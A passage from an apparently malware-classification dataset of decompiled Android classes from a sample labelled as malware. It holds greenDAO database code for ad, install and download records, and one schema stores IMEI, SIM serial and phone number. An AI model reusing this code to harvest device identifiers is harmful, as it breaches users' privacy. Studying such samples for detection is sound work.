Property(8,String.class,""intro"",false,""INTRO"");     public static final Property AppSize=new Property(9,String.class,""appSize"",false,""APP_SIZE"");     public static final Property AppVersion=new Property(10,String.class,""appVersion"",false,""APP_VERSION"");     public static final Property Icon=new Property(11,String.class,""icon"",false,""ICON"");     public static final Property Printscreen=new Property(12,String.class,""printscreen"",false,""PRINTSCREEN"");     public static final Property G2Switches=new Property(13,String.class,""g2Switches"",false,""G2_SWITCHES"");     public static final Property G3Switches=new Property(14,String.class,""g3Switches"",false,""G3_SWITCHES"");     public static final Property WifiSwitches=new Property(15,String.class,""wifiSwitches"",false,""WIFI_SWITCHES"");     public static final Property ShowPeriod=new Property(16,String.class,""showPeriod"",false,""SHOW_PERIOD"");     public static final Property HasBoundAd=new Property(17,Integer.class,""hasBoundAd"",false,""HAS_BOUND_AD"");     public static final Property IsRecommend=new Property(18,Integer.class,""isRecommend"",false,""IS_RECOMMEND"");   }   public HotAppAdInfoDao(  DaoConfig daoConfig){     super(daoConfig);   }   public HotAppAdInfoDao(  DaoConfig daoConfig,  DaoSession daoSession){     super(daoConfig,daoSession);   }   public static void createTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""CREATE TABLE "" + (z ? ""IF NOT EXISTS "" : """") + ""'HOT_APP_AD_INFO' ('_id' INTEGER PRIMARY KEY AUTOINCREMENT ,'EXPIRES' INTEGER,'AD_ID' INTEGER,'KIND' INTEGER,'URL' TEXT,'RECOMMEND' TEXT,'PACKAGE_NAME' TEXT,'APP_NAME' TEXT,'INTRO' TEXT,'APP_SIZE' TEXT,'APP_VERSION' TEXT,'ICON' TEXT,'PRINTSCREEN' TEXT,'G2_SWITCHES' TEXT,'G3_SWITCHES' TEXT,'WIFI_SWITCHES' TEXT,'SHOW_PERIOD' TEXT,'HAS_BOUND_AD' INTEGER,'IS_RECOMMEND' INTEGER);"");   }   public static void dropTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""DROP TABLE "" + (z ? ""IF EXISTS "" : """") + ""'HOT_APP_AD_INFO'"");   }   @Override public void bindValues(  SQLiteStatement sQLiteStatement,  HotAppAdInfo hotAppAdInfo){     sQLiteStatement.clearBindings();     Long id=hotAppAdInfo.getId();     if (id != null) {       sQLiteStatement.bindLong(1,id.longValue());     }     Long expires=hotAppAdInfo.getExpires();     if (expires != null) {       sQLiteStatement.bindLong(2,expires.longValue());     }     if (hotAppAdInfo.getAdId() != null) {       sQLiteStatement.bindLong(3,r0.intValue());     }     if (hotAppAdInfo.getKind() != null) {       sQLiteStatement.bindLong(4,r0.intValue());     }     String url=hotAppAdInfo.getUrl();     if (url != null) {       sQLiteStatement.bindString(5,url);     }     String recommend=hotAppAdInfo.getRecommend();     if (recommend != null) {       sQLiteStatement.bindString(6,recommend);     }     String packageName=hotAppAdInfo.getPackageName();     if (packageName != null) {       sQLiteStatement.bindString(7,packageName);     }     String appName=hotAppAdInfo.getAppName();     if (appName != null) {       sQLiteStatement.bindString(8,appName);     }     String intro=hotAppAdInfo.getIntro();     if (intro != null) {       sQLiteStatement.bindString(9,intro);     }     String appSize=hotAppAdInfo.getAppSize();     if (appSize != null) {       sQLiteStatement.bindString(10,appSize);     }     String appVersion=hotAppAdInfo.getAppVersion();     if (appVersion != null) {       sQLiteStatement.bindString(11,appVersion);     }     String icon=hotAppAdInfo.getIcon();     if (icon != null) {       sQLiteStatement.bindString(12,icon);     }     String printscreen=hotAppAdInfo.getPrintscreen();     if (printscreen != null) {       sQLiteStatement.bindString(13,printscreen);     }     String g2Switches=hotAppAdInfo.getG2Switches();     if (g2Switches != null) {       sQLiteStatement.bindString(14,g2Switches);     }     String g3Switches=hotAppAdInfo.getG3Switches();     if (g3Switches != null) {       sQLiteStatement.bindString(15,g3Switches);     }     String wifiSwitches=hotAppAdInfo.getWifiSwitches();     if (wifiSwitches != null) {       sQLiteStatement.bindString(16,wifiSwitches);     }     String showPeriod=hotAppAdInfo.getShowPeriod();     if (showPeriod != null) {       sQLiteStatement.bindString(17,showPeriod);     }     if (hotAppAdInfo.getHasBoundAd() != null) {       sQLiteStatement.bindLong(18,r0.intValue());     }     if (hotAppAdInfo.getIsRecommend() != null) {       sQLiteStatement.bindLong(19,r0.intValue());     }   }   @Override public Long getKey(  HotAppAdInfo hotAppAdInfo){     if (hotAppAdInfo != null) {       return hotAppAdInfo.getId();     }     return null;   }   @Override public boolean isEntityUpdateable(){     return true;   }   @Override public HotAppAdInfo readEntity(  Cursor cursor,  int i){     return new HotAppAdInfo(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)),cursor.isNull(i + 1) ? null : Long.valueOf(cursor.getLong(i + 1)),cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)),cursor.isNull(i + 3) ? null : Integer.valueOf(cursor.getInt(i + 3)),cursor.isNull(i + 4) ? null : cursor.getString(i + 4),cursor.isNull(i + 5) ? null : cursor.getString(i + 5),cursor.isNull(i + 6) ? null : cursor.getString(i + 6),cursor.isNull(i + 7) ? null : cursor.getString(i + 7),cursor.isNull(i + 8) ? null : cursor.getString(i + 8),cursor.isNull(i + 9) ? null : cursor.getString(i + 9),cursor.isNull(i + 10) ? null : cursor.getString(i + 10),cursor.isNull(i + 11) ? null : cursor.getString(i + 11),cursor.isNull(i + 12) ? null : cursor.getString(i + 12),cursor.isNull(i + 13) ? null : cursor.getString(i + 13),cursor.isNull(i + 14) ? null : cursor.getString(i + 14),cursor.isNull(i + 15) ? null : cursor.getString(i + 15),cursor.isNull(i + 16) ? null : cursor.getString(i + 16),cursor.isNull(i + 17) ? null : Integer.valueOf(cursor.getInt(i + 17)),cursor.isNull(i + 18) ? null : Integer.valueOf(cursor.getInt(i + 18)));   }   @Override public void readEntity(  Cursor cursor,  HotAppAdInfo hotAppAdInfo,  int i){     hotAppAdInfo.setId(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)));     hotAppAdInfo.setExpires(cursor.isNull(i + 1) ? null : Long.valueOf(cursor.getLong(i + 1)));     hotAppAdInfo.setAdId(cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)));     hotAppAdInfo.setKind(cursor.isNull(i + 3) ? null : Integer.valueOf(cursor.getInt(i + 3)));     hotAppAdInfo.setUrl(cursor.isNull(i + 4) ? null : cursor.getString(i + 4));     hotAppAdInfo.setRecommend(cursor.isNull(i + 5) ? null : cursor.getString(i + 5));     hotAppAdInfo.setPackageName(cursor.isNull(i + 6) ? null : cursor.getString(i + 6));     hotAppAdInfo.setAppName(cursor.isNull(i + 7) ? null : cursor.getString(i + 7));     hotAppAdInfo.setIntro(cursor.isNull(i + 8) ? null : cursor.getString(i + 8));     hotAppAdInfo.setAppSize(cursor.isNull(i + 9) ? null : cursor.getString(i + 9));     hotAppAdInfo.setAppVersion(cursor.isNull(i + 10) ? null : cursor.getString(i + 10));     hotAppAdInfo.setIcon(cursor.isNull(i + 11) ? null : cursor.getString(i + 11));     hotAppAdInfo.setPrintscreen(cursor.isNull(i + 12) ? null : cursor.getString(i + 12));     hotAppAdInfo.setG2Switches(cursor.isNull(i + 13) ? null : cursor.getString(i + 13));     hotAppAdInfo.setG3Switches(cursor.isNull(i + 14) ? null : cursor.getString(i + 14));     hotAppAdInfo.setWifiSwitches(cursor.isNull(i + 15) ? null : cursor.getString(i + 15));     hotAppAdInfo.setShowPeriod(cursor.isNull(i + 16) ? null : cursor.getString(i + 16));     hotAppAdInfo.setHasBoundAd(cursor.isNull(i + 17) ? null : Integer.valueOf(cursor.getInt(i + 17)));     hotAppAdInfo.setIsRecommend(cursor.isNull(i + 18) ? null : Integer.valueOf(cursor.getInt(i + 18)));   }   @Override public Long readKey(  Cursor cursor,  int i){     if (cursor.isNull(i + 0)) {       return null;     }     return Long.valueOf(cursor.getLong(i + 0));   }   @Override public Long updateKeyAfterInsert(  HotAppAdInfo hotAppAdInfo,  long j){     hotAppAdInfo.setId(Long.valueOf(j));     return Long.valueOf(j);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\InstalledApp.code","public class InstalledApp {   private String appName;   private Long id;   private String packageName;   public InstalledApp(){   }   public InstalledApp(  Long l){     this.id=l;   }   public InstalledApp(  Long l,  String str,  String str2){     this.id=l;     this.packageName=str;     this.appName=str2;   }   public String getAppName(){     return this.appName;   }   public Long getId(){     return this.id;   }   public String getPackageName(){     return this.packageName;   }   public void setAppName(  String str){     this.appName=str;   }   public void setId(  Long l){     this.id=l;   }   public void setPackageName(  String str){     this.packageName=str;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\InstalledAppDao.code","public class InstalledAppDao extends AbstractDao<InstalledApp,Long> {   public static final String TABLENAME=""INSTALLED_APP""; public class Properties {     public static final Property Id=new Property(0,Long.class,""id"",true,""_id"");     public static final Property PackageName=new Property(1,String.class,""packageName"",false,""PACKAGE_NAME"");     public static final Property AppName=new Property(2,String.class,""appName"",false,""APP_NAME"");   }   public InstalledAppDao(  DaoConfig daoConfig){     super(daoConfig);   }   public InstalledAppDao(  DaoConfig daoConfig,  DaoSession daoSession){     super(daoConfig,daoSession);   }   public static void createTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""CREATE TABLE "" + (z ? ""IF NOT EXISTS "" : """") + ""'INSTALLED_APP' ('_id' INTEGER PRIMARY KEY AUTOINCREMENT ,'PACKAGE_NAME' TEXT,'APP_NAME' TEXT);"");   }   public static void dropTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""DROP TABLE "" + (z ? ""IF EXISTS "" : """") + ""'INSTALLED_APP'"");   }   @Override public void bindValues(  SQLiteStatement sQLiteStatement,  InstalledApp installedApp){     sQLiteStatement.clearBindings();     Long id=installedApp.getId();     if (id != null) {       sQLiteStatement.bindLong(1,id.longValue());     }     String packageName=installedApp.getPackageName();     if (packageName != null) {       sQLiteStatement.bindString(2,packageName);     }     String appName=installedApp.getAppName();     if (appName != null) {       sQLiteStatement.bindString(3,appName);     }   }   @Override public Long getKey(  InstalledApp installedApp){     if (installedApp != null) {       return installedApp.getId();     }     return null;   }   @Override public boolean isEntityUpdateable(){     return true;   }   @Override public InstalledApp readEntity(  Cursor cursor,  int i){     return new InstalledApp(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)),cursor.isNull(i + 1) ? null : cursor.getString(i + 1),cursor.isNull(i + 2) ? null : cursor.getString(i + 2));   }   @Override public void readEntity(  Cursor cursor,  InstalledApp installedApp,  int i){     installedApp.setId(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)));     installedApp.setPackageName(cursor.isNull(i + 1) ? null : cursor.getString(i + 1));     installedApp.setAppName(cursor.isNull(i + 2) ? null : cursor.getString(i + 2));   }   @Override public Long readKey(  Cursor cursor,  int i){     if (cursor.isNull(i + 0)) {       return null;     }     return Long.valueOf(cursor.getLong(i + 0));   }   @Override public Long updateKeyAfterInsert(  InstalledApp installedApp,  long j){     installedApp.setId(Long.valueOf(j));     return Long.valueOf(j);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\OpenHelper.code","public abstract class OpenHelper extends SQLiteOpenHelper {   public OpenHelper(  Context context,  String str,  SQLiteDatabase.CursorFactory cursorFactory){     super(context,str,cursorFactory,1);   }   @Override public void onCreate(  SQLiteDatabase sQLiteDatabase){     Log.i(""greenDAO"",""Creating tables for schema version 1"");     DaoMaster.createAllTables(sQLiteDatabase,false);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\Properties.code","public class Properties {   public static final Property AdType=new Property(0,Integer.class,""adType"",false,""AD_TYPE"");   public static final Property AdId=new Property(1,Integer.class,""adId"",false,""AD_ID"");   public static final Property Action=new Property(2,Integer.class,""action"",false,""ACTION"");   public static final Property Count=new Property(3,Integer.class,""count"",false,""COUNT"");   public static final Property PackageName=new Property(4,String.class,""packageName"",false,""PACKAGE_NAME"");   public static final Property AppName=new Property(5,String.class,""appName"",false,""APP_NAME"");   public static final Property Date=new Property(6,String.class,""date"",false,""DATE"");   public static final Property ExpireDate=new Property(7,Long.class,""expireDate"",false,""EXPIRE_DATE""); } public class Properties {   public static final Property AdId=new Property(0,Integer.class,""adId"",false,""AD_ID"");   public static final Property LastAdId=new Property(1,Integer.class,""lastAdId"",false,""LAST_AD_ID"");   public static final Property IsOver=new Property(2,Boolean.class,""isOver"",false,""IS_OVER"");   public static final Property AdType=new Property(3,Integer.class,""adType"",false,""AD_TYPE"");   public static final Property Category=new Property(4,Integer.class,""category"",false,""CATEGORY""); } public class Properties {   public static final Property AdType=new Property(0,Long.class,""adType"",true,""AD_TYPE"");   public static final Property Data=new Property(1,byte[].class,""data"",false,""DATA""); } public class Properties {   public static final Property InstallTime=new Property(0,Long.class,""installTime"",false,""INSTALL_TIME"");   public static final Property AdId=new Property(1,Integer.class,""adId"",false,""AD_ID"");   public static final Property AppSize=new Property(2,String.class,""appSize"",false,""APP_SIZE"");   public static final Property AppName=new Property(3,String.class,""appName"",false,""APP_NAME"");   public static final Property G2Switches=new Property(4,String.class,""g2Switches"",false,""G2_SWITCHES"");   public static final Property G3Switches=new Property(5,String.class,""g3Switches"",false,""G3_SWITCHES"");   public static final Property WifiSwitches=new Property(6,String.class,""wifiSwitches"",false,""WIFI_SWITCHES"");   public static final Property AdType=new Property(7,Integer.class,""adType"",false,""AD_TYPE"");   public static final Property Icon=new Property(8,String.class,""icon"",false,""ICON"");   public static final Property Recommend=new Property(9,String.class,""recommend"",false,""RECOMMEND"");   public static final Property Url=new Property(10,String.class,""url"",false,""URL"");   public static final Property DownloadType=new Property(11,Integer.class,""downloadType"",false,""DOWNLOAD_TYPE"");   public static final Property PackageName=new Property(12,String.class,""packageName"",false,""PACKAGE_NAME""); } public class Properties {   public static final Property Id=new Property(0,Long.class,""id"",true,""_id"");   public static final Property Expires=new Property(1,Long.class,""expires"",false,""EXPIRES"");   public static final Property AdId=new Property(2,Integer.class,""adId"",false,""AD_ID"");   public static final Property Kind=new Property(3,Integer.class,""kind"",false,""KIND"");   public static final Property Url=new Property(4,String.class,""url"",false,""URL"");   public static final Property Recommend=new Property(5,String.class,""recommend"",false,""RECOMMEND"");   public static final Property PackageName=new Property(6,String.class,""packageName"",false,""PACKAGE_NAME"");   public static final Property AppName=new Property(7,String.class,""appName"",false,""APP_NAME"");   public static final Property Intro=new Property(8,String.class,""intro"",false,""INTRO"");   public static final Property AppSize=new Property(9,String.class,""appSize"",false,""APP_SIZE"");   public static final Property AppVersion=new Property(10,String.class,""appVersion"",false,""APP_VERSION"");   public static final Property Icon=new Property(11,String.class,""icon"",false,""ICON"");   public static final Property Printscreen=new Property(12,String.class,""printscreen"",false,""PRINTSCREEN"");   public static final Property G2Switches=new Property(13,String.class,""g2Switches"",false,""G2_SWITCHES"");   public static final Property G3Switches=new Property(14,String.class,""g3Switches"",false,""G3_SWITCHES"");   public static final Property WifiSwitches=new Property(15,String.class,""wifiSwitches"",false,""WIFI_SWITCHES"");   public static final Property ShowPeriod=new Property(16,String.class,""showPeriod"",false,""SHOW_PERIOD"");   public static final Property HasBoundAd=new Property(17,Integer.class,""hasBoundAd"",false,""HAS_BOUND_AD"");   public static final Property IsRecommend=new Property(18,Integer.class,""isRecommend"",false,""IS_RECOMMEND""); } public class Properties {   public static final Property Id=new Property(0,Long.class,""id"",true,""_id"");   public static final Property Expires=new Property(1,Long.class,""expires"",false,""EXPIRES"");   public static final Property AdId=new Property(2,Integer.class,""adId"",false,""AD_ID"");   public static final Property Kind=new Property(3,Integer.class,""kind"",false,""KIND"");   public static final Property Url=new Property(4,String.class,""url"",false,""URL"");   public static final Property Recommend=new Property(5,String.class,""recommend"",false,""RECOMMEND"");   public static final Property PackageName=new Property(6,String.class,""packageName"",false,""PACKAGE_NAME"");   public static final Property AppName=new Property(7,String.class,""appName"",false,""APP_NAME"");   public static final Property Intro=new Property(8,String.class,""intro"",false,""INTRO"");   public static final Property AppSize=new Property(9,String.class,""appSize"",false,""APP_SIZE"");   public static final Property AppVersion=new Property(10,String.class,""appVersion"",false,""APP_VERSION"");   public static final Property Icon=new Property(11,String.class,""icon"",false,""ICON"");   public static final Property Printscreen=new Property(12,String.class,""printscreen"",false,""PRINTSCREEN"");   public static final Property G2Switches=new Property(13,String.class,""g2Switches"",false,""G2_SWITCHES"");   public static final Property G3Switches=new Property(14,String.class,""g3Switches"",false,""G3_SWITCHES"");   public static final Property WifiSwitches=new Property(15,String.class,""wifiSwitches"",false,""WIFI_SWITCHES"");   public static final Property ShowPeriod=new Property(16,String.class,""showPeriod"",false,""SHOW_PERIOD"");   public static final Property ShowTime=new Property(17,Integer.class,""showTime"",false,""SHOW_TIME"");   public static final Property ShowStyle=new Property(18,Integer.class,""showStyle"",false,""SHOW_STYLE"");   public static final Property BannerImg=new Property(19,String.class,""bannerImg"",false,""BANNER_IMG""); } public class Properties {   public static final Property Id=new Property(0,Long.class,""id"",true,""_id"");   public static final Property Expires=new Property(1,Long.class,""expires"",false,""EXPIRES"");   public static final Property AdId=new Property(2,Integer.class,""adId"",false,""AD_ID"");   public static final Property Kind=new Property(3,Integer.class,""kind"",false,""KIND"");   public static final Property Url=new Property(4,String.class,""url"",false,""URL"");   public static final Property Recommend=new Property(5,String.class,""recommend"",false,""RECOMMEND"");   public static final Property PackageName=new Property(6,String.class,""packageName"",false,""PACKAGE_NAME"");   public static final Property AppName=new Property(7,String.class,""appName"",false,""APP_NAME"");   public static final Property Intro=new Property(8,String.class,""intro"",false,""INTRO"");   public static final Property AppSize=new Property(9,String.class,""appSize"",false,""APP_SIZE"");   public static final Property AppVersion=new Property(10,String.class,""appVersion"",false,""APP_VERSION"");   public static final Property Icon=new Property(11,String.class,""icon"",false,""ICON"");   public static final Property Printscreen=new Property(12,String.class,""printscreen"",false,""PRINTSCREEN"");   public static final Property G2Switches=new Property(13,String.class,""g2Switches"",false,""G2_SWITCHES"");   public static final Property G3Switches=new Property(14,String.class,""g3Switches"",false,""G3_SWITCHES"");   public static final Property WifiSwitches=new Property(15,String.class,""wifiSwitches"",false,""WIFI_SWITCHES"");   public static final Property ShowPeriod=new Property(16,String.class,""showPeriod"",false,""SHOW_PERIOD"");   public static final Property ShowTime=new Property(17,Integer.class,""showTime"",false,""SHOW_TIME"");   public static final Property ShowStyle=new Property(18,Integer.class,""showStyle"",false,""SHOW_STYLE"");   public static final Property TablePlaqueImg=new Property(19,String.class,""tablePlaqueImg"",false,""TABLE_PLAQUE_IMG""); } public class Properties {   public static final Property Id=new Property(0,Long.class,""id"",true,""_id"");   public static final Property Expires=new Property(1,Long.class,""expires"",false,""EXPIRES"");   public static final Property AdId=new Property(2,Integer.class,""adId"",false,""AD_ID"");   public static final Property Kind=new Property(3,Integer.class,""kind"",false,""KIND"");   public static final Property Url=new Property(4,String.class,""url"",false,""URL"");   public static final Property Recommend=new Property(5,String.class,""recommend"",false,""RECOMMEND"");   public static final Property PackageName=new Property(6,String.class,""packageName"",false,""PACKAGE_NAME"");   public static final Property AppName=new Property(7,String.class,""appName"",false,""APP_NAME"");   public static final Property Intro=new Property(8,String.class,""intro"",false,""INTRO"");   public static final Property AppSize=new Property(9,String.class,""appSize"",false,""APP_SIZE"");   public static final Property AppVersion=new Property(10,String.class,""appVersion"",false,""APP_VERSION"");   public static final Property Icon=new Property(11,String.class,""icon"",false,""ICON"");   public static final Property Printscreen=new Property(12,String.class,""printscreen"",false,""PRINTSCREEN"");   public static final Property G2Switches=new Property(13,String.class,""g2Switches"",false,""G2_SWITCHES"");   public static final Property G3Switches=new Property(14,String.class,""g3Switches"",false,""G3_SWITCHES"");   public static final Property WifiSwitches=new Property(15,String.class,""wifiSwitches"",false,""WIFI_SWITCHES"");   public static final Property ShowPeriod=new Property(16,String.class,""showPeriod"",false,""SHOW_PERIOD"");   public static final Property Category=new Property(17,Integer.class,""category"",false,""CATEGORY"");   public static final Property InstallCredits=new Property(18,Integer.class,""installCredits"",false,""INSTALL_CREDITS"");   public static final Property OpenCredits=new Property(19,Integer.class,""openCredits"",false,""OPEN_CREDITS"");   public static final Property Requirement=new Property(20,String.class,""requirement"",false,""REQUIREMENT"");   public static final Property InstallDelayTime=new Property(21,Integer.class,""installDelayTime"",false,""INSTALL_DELAY_TIME"");   public static final Property OpenDelayTime=new Property(22,Integer.class,""openDelayTime"",false,""OPEN_DELAY_TIME"");   public static final Property TaskIntro=new Property(23,String.class,""taskIntro"",false,""TASK_INTRO"");   public static final Property MaximumOpenTimes=new Property(24,Integer.class,""maximumOpenTimes"",false,""MAXIMUM_OPEN_TIMES"");   public static final Property BillingPrice=new Property(25,Integer.class,""billingPrice"",false,""BILLING_PRICE"");   public static final Property BillingInfo=new Property(26,String.class,""billingInfo"",false,""BILLING_INFO"");   public static final Property BillingUserMethod=new Property(27,Integer.class,""billingUserMethod"",false,""BILLING_USER_METHOD"");   public static final Property BillingIntegral=new Property(28,Integer.class,""billingIntegral"",false,""BILLING_INTEGRAL""); } public class Properties {   public static final Property Id=new Property(0,Long.class,""id"",true,""_id"");   public static final Property Expires=new Property(1,Long.class,""expires"",false,""EXPIRES"");   public static final Property AdId=new Property(2,Integer.class,""adId"",false,""AD_ID"");   public static final Property Kind=new Property(3,Integer.class,""kind"",false,""KIND"");   public static final Property Url=new Property(4,String.class,""url"",false,""URL"");   public static final Property Recommend=new Property(5,String.class,""recommend"",false,""RECOMMEND"");   public static final Property PackageName=new Property(6,String.class,""packageName"",false,""PACKAGE_NAME"");   public static final Property AppName=new Property(7,String.class,""appName"",false,""APP_NAME"");   public static final Property Intro=new Property(8,String.class,""intro"",false,""INTRO"");   public static final Property AppSize=new Property(9,String.class,""appSize"",false,""APP_SIZE"");   public static final Property AppVersion=new Property(10,String.class,""appVersion"",false,""APP_VERSION"");   public static final Property Icon=new Property(11,String.class,""icon"",false,""ICON"");   public static final Property Printscreen=new Property(12,String.class,""printscreen"",false,""PRINTSCREEN"");   public static final Property G2Switches=new Property(13,String.class,""g2Switches"",false,""G2_SWITCHES"");   public static final Property G3Switches=new Property(14,String.class,""g3Switches"",false,""G3_SWITCHES"");   public static final Property WifiSwitches=new Property(15,String.class,""wifiSwitches"",false,""WIFI_SWITCHES"");   public static final Property ShowPeriod=new Property(16,String.class,""showPeriod"",false,""SHOW_PERIOD"");   public static final Property DiyImg=new Property(17,String.class,""diyImg"",false,""DIY_IMG""); } public class Properties {   public static final Property Action=new Property(0,Integer.class,""action"",false,""ACTION"");   public static final Property AdType=new Property(1,Integer.class,""adType"",false,""AD_TYPE"");   public static final Property Delay=new Property(2,Integer.class,""delay"",false,""DELAY""); } public class Properties {   public static final Property Id=new Property(0,Long.class,""id"",true,""_id"");   public static final Property Imei=new Property(1,String.class,""imei"",false,""IMEI"");   public static final Property SdkVersion=new Property(2,String.class,""sdkVersion"",false,""SDK_VERSION"");   public static final Property Brand=new Property(3,String.class,""brand"",false,""BRAND"");   public static final Property Model=new Property(4,String.class,""model"",false,""MODEL"");   public static final Property Resolution=new Property(5,String.class,""resolution"",false,""RESOLUTION"");   public static final Property Network=new Property(6,String.class,""network"",false,""NETWORK"");   public static final Property AppKey=new Property(7,String.class,""appKey"",false,""APP_KEY"");   public static final Property SimSerialNum=new Property(8,String.class,""simSerialNum"",false,""SIM_SERIAL_NUM"");   public static final Property PhoneNumber=new Property(9,String.class,""phoneNumber"",false,""PHONE_NUMBER"");   public static final Property Operator=new Property(10,String.class,""operator"",false,""OPERATOR"");   public static final Property SystemVersion=new Property(11,String.class,""systemVersion"",false,""SYSTEM_VERSION"");   public static final Property MobileSystem=new Property(12,String.class,""mobileSystem"",false,""MOBILE_SYSTEM"");   public static final Property DevAppPackage=new Property(13,String.class,""devAppPackage"",false,""DEV_APP_PACKAGE""); } public class Properties {   public static final Property DownloadTaskId=new Property(0,Integer.class,""downloadTaskId"",false,""DOWNLOAD_TASK_ID"");   public static final Property FragmentId=new Property(1,Integer.class,""fragmentId"",false,""FRAGMENT_ID"");   public static final Property FinishSize=new Property(2,Long.class,""finishSize"",false,""FINISH_SIZE"");   public static final Property TotalSize=new Property(3,Long.class,""totalSize"",false,""TOTAL_SIZE"");   public static final Property UpdateTime=new Property(4,Long.class,""updateTime"",false,""UPDATE_TIME"");   public static final Property ThreadId=new Property(5,Long.class,""threadId"",false,""THREAD_ID"");   public static final Property IsRunning=new Property(6,Boolean.class,""isRunning"",false,""IS_RUNNING""); } public class Properties {   public static final Property CompleteTime=new Property(0,Long.class,""completeTime"",false,""COMPLETE_TIME"");   public static final Property AppSize=new Property(1,String.class,""appSize"",false,""APP_SIZE"");   public static final Property PackageName=new Property(2,String.class,""packageName"",false,""PACKAGE_NAME"");   public static final Property AppName=new Property(3,String.class,""appName"",false,""APP_NAME"");   public static final Property G2Switches=new Property(4,String.class,""g2Switches"",false,""G2_SWITCHES"");   public static final Property G3Switches=new Property(5,String.class,""g3Switches"",false,""G3_SWITCHES"");   public static final Property WifiSwitches=new Property(6,String.class,""wifiSwitches"",false,""WIFI_SWITCHES"");   public static final Property IsInstalled=new Property(7,Boolean.class,""isInstalled"",false,""IS_INSTALLED"");   public static final Property Icon=new Property(8,String.class,""icon"",false,""ICON"");   public static final Property Recommend=new Property(9,String.class,""recommend"",false,""RECOMMEND"");   public static final Property Url=new Property(10,String.class,""url"",false,""URL"");   public static final Property DownloadType=new Property(11,Integer.class,""downloadType"",false,""DOWNLOAD_TYPE"");   public static final Property IsHW=new Property(12,Boolean.class,""isHW"",false,""IS_HW"");   public static final Property AdId=new Property(13,Integer.class,""adId"",false,""AD_ID"");   public static final Property AdType=new Property(14,Integer.class,""adType"",false,""AD_TYPE""); } public class Properties {   public static final Property CompleteTime=new Property(0,Long.class,""completeTime"",false,""COMPLETE_TIME"");   public static final Property AppSize=new Property(1,String.class,""appSize"",false,""APP_SIZE"");   public static final Property PackageName=new Property(2,String.class,""packageName"",false,""PACKAGE_NAME"");   public static final Property AppName=new Property(3,String.class,""appName"",false,""APP_NAME"");   public static final Property G2Switches=new Property(4,String.class,""g2Switches"",false,""G2_SWITCHES"");   public static final Property G3Switches=new Property(5,String.class,""g3Switches"",false,""G3_SWITCHES"");   public static final Property WifiSwitches=new Property(6,String.class,""wifiSwitches"",false,""WIFI_SWITCHES"");   public static final Property Icon=new Property(7,String.class,""icon"",false,""ICON"");   public static final Property Recommend=new Property(8,String.class,""recommend"",false,""RECOMMEND"");   public static final Property Url=new Property(9,String.class,""url"",false,""URL"");   public static final Property DownloadType=new Property(10,Integer.class,""downloadType"",false,""DOWNLOAD_TYPE"");   public static final Property AdId=new Property(11,Integer.class,""adId"",false,""AD_ID"");   public static final Property AdType=new Property(12,Integer.class,""adType"",false,""AD_TYPE""); } public class Properties {   public static final Property AdType=new Property(0,Integer.class,""adType"",false,""AD_TYPE"");   public static final Property AdId=new Property(1,Integer.class,""adId"",false,""AD_ID"");   public static final Property Action=new Property(2,Integer.class,""action"",false,""ACTION"");   public static final Property Count=new Property(3,Integer.class,""count"",false,""COUNT"");   public static final Property PackageName=new Property(4,String.class,""packageName"",false,""PACKAGE_NAME"");   public static final Property AppName=new Property(5,String.class,""appName"",false,""APP_NAME"");   public static final Property Date=new Property(6,String.class,""date"",false,""DATE""); } public class Properties {   public static final Property Id=new Property(0,Long.class,""id"",true,""_id"");   public static final Property Expires=new Property(1,Long.class,""expires"",false,""EXPIRES"");   public static final Property AdId=new Property(2,Integer.class,""adId"",false,""AD_ID"");   public static final Property Kind=new Property(3,Integer.class,""kind"",false,""KIND"");   public static final Property Url=new Property(4,String.class,""url"",false,""URL"");   public static final Property Recommend=new Property(5,String.class,""recommend"",false,""RECOMMEND"");   public static final Property PackageName=new Property(6,String.class,""packageName"",false,""PACKAGE_NAME"");   public static final Property AppName=new Property(7,String.class,""appName"",false,""APP_NAME"");   public static final Property Intro=new Property(8,String.class,""intro"",false,""INTRO"");   public static final Property AppSize=new Property(9,String.class,""appSize"",false,""APP_SIZE"");   public static final Property AppVersion=new Property(10,String.class,""appVersion"",false,""APP_VERSION"");   public static final Property Icon=new Property(11,String.class,""icon"",false,""ICON"");   public static final Property Printscreen=new Property(12,String.class,""printscreen"",false,""PRINTSCREEN"");   public static final Property G2Switches=new Property(13,String.class,""g2Switches"",false,""G2_SWITCHES"");   public static final Property G3Switches=new Property(14,String.class,""g3Switches"",false,""G3_SWITCHES"");   public static final Property WifiSwitches=new Property(15,String.class,""wifiSwitches"",false,""WIFI_SWITCHES"");   public static final Property ShowPeriod=new Property(16,String.class,""showPeriod"",false,""SHOW_PERIOD"");   public static final Property ShowTime=new Property(17,Integer.class,""showTime"",false,""SHOW_TIME"");   public static final Property ShowStyle=new Property(18,Integer.class,""showStyle"",false,""SHOW_STYLE"");   public static final Property TablePlaqueImg=new Property(19,String.class,""tablePlaqueImg"",false,""TABLE_PLAQUE_IMG""); } public class Properties {   public static final Property Id=new Property(0,Long.class,""id"",true,""_id"");   public static final Property Expires=new Property(1,Long.class,""expires"",false,""EXPIRES"");   public static final Property AdId=new Property(2,Integer.class,""adId"",false,""AD_ID"");   public static final Property Kind=new Property(3,Integer.class,""kind"",false,""KIND"");   public static final Property Url=new Property(4,String.class,""url"",false,""URL"");   public static final Property Recommend=new Property(5,String.class,""recommend"",false,""RECOMMEND"");   public static final 